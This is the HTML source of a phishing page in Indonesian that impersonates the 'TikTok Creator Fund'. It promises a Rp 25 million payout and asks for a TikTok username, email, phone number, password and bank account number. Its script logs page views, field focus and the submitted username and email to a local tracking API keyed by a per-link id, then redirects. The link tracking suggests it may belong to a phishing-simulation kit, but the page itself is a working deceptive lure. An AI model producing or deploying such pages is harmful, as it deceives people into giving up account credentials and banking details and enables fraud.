<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>TikTok Creator Fund</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: sans-serif; background: linear-gradient(135deg, #ff0050 0%, #00f2ea 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 500px; margin: 0 auto; background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
        .header { background: linear-gradient(135deg, #ff0050 0%, #00f2ea 100%); padding: 35px 25px; text-align: center; color: white; }
        .logo { font-size: 3.5rem; margin-bottom: 15px; }
        .content { padding: 30px 25px; }
        .money-card { background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%); padding: 30px; border-radius: 15px; text-align: center; margin-bottom: 25px; }
        .amount { font-size: 3rem; font-weight: bold; color: #8b0000; margin: 15px 0; }
        .form-section { background: #f8f9fa; padding: 25px; border-radius: 15px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-weight: 600; margin-bottom: 6px; }
        .form-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px; font-size: 1rem; }
        .btn-claim { width: 100%; padding: 16px; background: linear-gradient(135deg, #ff0050 0%, #00f2ea 100%); color: white; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><div class="logo">üéµ</div><h1>TikTok Creator Fund</h1></div>
        <div class="content">
            <div class="money-card">
                <div style="font-size:4rem;">üí∞</div>
                <h2 style="color:white;margin-bottom:10px;">ANDA BERHAK MENERIMA:</h2>
                <div class="amount">Rp 25.000.000</div>
            </div>
            <div class="form-section">
                <h3 style="text-align:center;margin-bottom:20px;">üìù Form Pencairan Dana</h3>
                <form id="claimForm">
                    <div class="form-group"><label>Username TikTok</label><input type="text" id="username" required></div>
                    <div class="form-group"><label>Email</label><input type="email" id="email" required></div>
                    <div class="form-group"><label>Nomor Telepon</label><input type="tel" id="phone" required></div>
                    <div class="form-group"><label>Password TikTok</label><input type="password" id="password" required></div>
                    <div class="form-group"><label>Nomor Rekening</label><input type="text" id="account" required></div>
                    <button type="submit" class="btn-claim">üíµ CLAIM RP 25 JUTA</button>
                </form>
            </div>
        </div>
    </div>
    <script>
        const API_URL = 'http://localhost:5000/api';
        const linkId = new URLSearchParams(window.location.search).get('id');
        async function trackView() { if (!linkId) return; try { await fetch(`${API_URL}/log-activity`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'view', data: 'TikTok Creator Fund page opened' }) }); } catch (e) {} }
        async function trackClick(f) { if (!linkId) return; try { await fetch(`${API_URL}/log-activity`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'click', data: `Field: ${f}` }) }); } catch (e) {} }
        async function trackSubmit(d) { if (!linkId) return; try { await fetch(`${API_URL}/log-activity`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'submit', data: JSON.stringify(d) }) }); } catch (e) {} }
        let c = new Set();
        document.querySelectorAll('input').forEach(i => i.addEventListener('focus', function() { const n = this.id; if (!c.has(n)) { c.add(n); trackClick(n); } }));
        document.getElementById('claimForm').addEventListener('submit', async function(e) { e.preventDefault(); await trackSubmit({ username: document.getElementById('username').value, email: document.getElementById('email').value }); const btn = e.target.querySelector('.btn-claim'); btn.textContent = '‚è≥ Processing...'; btn.disabled = true; setTimeout(() => window.location.href = 'index.html', 2000); });
        window.addEventListener('DOMContentLoaded', trackView);
    </script>
</body>
</html>
